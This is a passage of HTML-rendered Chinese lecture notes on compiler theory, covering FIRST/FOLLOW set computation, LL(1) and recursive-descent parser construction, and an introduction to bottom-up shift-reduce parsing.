class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mn>1</mn></msub><msub><mi>X</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>X</mi><mi>n</mi></msub><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">X_1X_2..X_n\rightarrow^{*}\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8387em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>，则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FIRST%E9%9B%86%E5%90%88%E7%9A%84%E6%B1%82%E6%B3%95.jpg" alt="FIRST集合的求法"></li></ol></li></ul></li></ul></li><li><p>计算FOLLOW集合</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span></eq>的求法，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>S</mi><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mo>…</mo><mi>U</mi><mi>a</mi><mo>…</mo><mo separator="true">,</mo><mi>a</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FOLLOW(U)=\{a|S\rightarrow^{*}\dots Ua\dots,a\in V_T\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></eq>,该定义中，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>必须从S推得才能有<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mtext>集合</mtext></mrow><annotation encoding="application/x-tex">FOLLOW集合</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord cjk_fallback">集合</span></span></span></span></eq></li><li><ol><li>对于文法的开始/识别符号S，令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">$</mi><mo>∈</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\$\in FOLLOW(S)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">$</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>$ A \rightarrow \alpha B \beta <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>则，</mtext></mrow><annotation encoding="application/x-tex">则，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">则，</span></span></span></span></eq>FIRST(\beta)<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>中的非</mtext></mrow><annotation encoding="application/x-tex">中的非</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">中的非</span></span></span></span></eq>\epsilon<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>元素属于</mtext></mrow><annotation encoding="application/x-tex">元素属于</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">元素属于</span></span></span></span></eq>FOLLOW(B)$</li></ol></li><li><ol start="3"><li>$ A \rightarrow \alpha B <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 4: ，或 $̲A\rightarrow \a…" style="color:#cc0000"><span class="cjk_fallback">，或 $A\rightarrow \alpha B \beta</span></span></eq>，而 $ FIRST(\beta) <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 4: 含有 $̲ \epsilon $ ，则" style="color:#cc0000"><span class="cjk_fallback">含有 $ \epsilon $ ，则</span></span></eq> FOLLOW(A) $ 的元素属于$ FOLLOW(B) $<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FOLLOW%E9%9B%86%E5%90%88%E7%9A%84%E6%B1%82%E6%B3%95.jpg" alt="FOLLOW集合的求法"></li></ol></li></ul></li></ul><h3 id="4-%E9%A2%84%E6%B5%8B%E5%88%86%E6%9E%90%E5%99%A8%E7%9A%84%E6%9E%84%E9%80%A0" tabindex="-1">4 预测分析器的构造</h3><h4 id="%E9%80%92%E5%BD%92%E5%AD%90%E7%A8%8B%E5%BA%8F%E6%B3%95" tabindex="-1">递归子程序法</h4><ul><li>基本思想：对真实推导过程的直接模拟</li><li>约定：每进入一个分析子程序前，已读到该子程序相应的非终结符号推导出的第一个终结符号/终结首符号。<ul><li>例如，当读到IF语句的第一个单词IF时，便知道将要进行IF语句的识别，于是调用对应于&lt;IF条件语句&gt;的分析子程序进行分析</li></ul></li><li>例子：<img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%88%86%E6%9E%90%E5%AD%90%E7%A8%8B%E5%BA%8F%E6%B3%95%E4%BE%8B%E5%AD%90.jpg" alt="分析子程序法例子"></li></ul><h4 id="%E7%A1%AE%E5%AE%9A%E7%9A%84ll(1)%E5%88%86%E6%9E%90%E5%99%A8" tabindex="-1">确定的LL(1)分析器</h4><ul><li><p>LL(1)文法：</p><ul><li>从左到右扫描输入符号串，从开始符号出发生成句子的最左推导。对于形如 U→α1|α2|…|αn 的产生式，只要向输入符号串中查看一个输入符号，便能惟一确定当前应选择的产生式，由此而得名LL(1)分析法。</li><li>当需要向输入串中查看K个输入符号，才能惟一确定当前应选择的产生式时，称为LL(K)分析法</li></ul></li><li><p>分析器程序结构：一张分析表M和一个符号栈S</p><ul><li>分析表的元素<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>U</mi><mtext>，</mtext><mi>a</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">M[U，a]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">a</span><span class="mclose">]</span></span></span></span></eq>为一条关于该非终结符号U的产生式，指出当该非终结符号U面临输入符号a时应选择的产生式，分析表的元素也可能是一个出错标志，指出非终结符号U不能面临终结符号a。</li><li>符号栈S用于存放文法的符号，当文法和待分析的符号串确定后，符号栈的内容随分析过程而不断变化。开始时，栈底放“$”，假定输入符号串以“$”结束。</li></ul></li><li><p>分析过程：<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/LL(1)%E5%88%86%E6%9E%90%E5%99%A8%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%E4%B8%BE%E4%BE%8B1.jpg" alt><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/LL(1)%E5%88%86%E6%9E%90%E5%99%A8%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%E4%B8%BE%E4%BE%8B2.jpg" alt></p></li><li><p>分析表的构造</p><ul><li><ol><li>对<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>中的每一个终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>,置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,a]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>,则对于属于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq>的每一个终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">$</mi></mrow><annotation encoding="application/x-tex">\$</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">$</span></span></span></span></eq>,分别置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,b]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi mathvariant="normal">$</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,\$]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">$</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq></li></ol></li><li><ol start="3"><li>如有不能按规则1与2构造的元素置出错标志<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E6%9E%84%E9%80%A0%E5%88%86%E6%9E%90%E8%A1%A8%E4%BE%8B%E5%AD%90.jpg" alt="构造分析表例子"></li></ol></li></ul></li><li><p>二义性文法的分析表中存在冲突项，即通过一个符号由多个产生式</p></li></ul><h2 id="4(2)%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90" tabindex="-1">4(2)自下而上的语法分析</h2><h3 id="%E8%87%AA%E4%B8%8B%E8%80%8C%E4%B8%8A%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E7%AE%80%E4%BB%8B" tabindex="-1">自下而上语法分析简介</h3><ul><li><p>基本思想</p><ul><li>推导——从输入的符号串开始逐步向上归约，试图归约到文法的开始/识别符号。</li><li>语法树——以输入符号串作为末端结点符号串，向根结点方向构造语法树，使识别符号正好是语法树的根结点。</li><li>程序的编译——从该高级语言文法的源程序或与其等价的单词串出发，试图归约到该文法的开始符号——&lt;程序&gt;</li></ul></li><li><p>基本实现技术——移进-归约法</p><ul><li>引进一个后进先出的栈来存放符号，按照扫描顺序把当前输入符号下推入栈中(移进)，然后查看栈顶的符号串是否可以被归约。</li></ul></li><li><p>短语： <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo><mover><mo><mo>⇒</mo></mo><mo lspace="0em" rspace="0em">∗</mo></mover></mo><mi>α</mi><mi>A</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">S\stackrel{*}{ \Rightarrow } \alpha A c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9926em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9926em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">⇒</span></span></span><span style="top:-3.5669em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span></span></span></span></eq>,且 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo><mover><mo><mo>⇒</mo></mo><mo lspace="0em" rspace="0em">+</mo></mover></mo><mi>β</mi></mrow><annotation encoding="application/x-tex">A\stackrel{+}{ \Rightarrow } \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0752em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0752em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">⇒</span></span></span><span style="top:-3.5669em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">+</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq>,则称<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq>是句型<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mi>A</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">\alpha A c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord mathnormal">A</span><span class="mord mathnormal">c</span></span></span></span></eq>相对于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的短语</p><ul><li>若有<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>⇒</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">A \Rightarrow \beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq>,则称<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></eq>是句型<eq><span class="katex"><span class="katex-mathml"><math 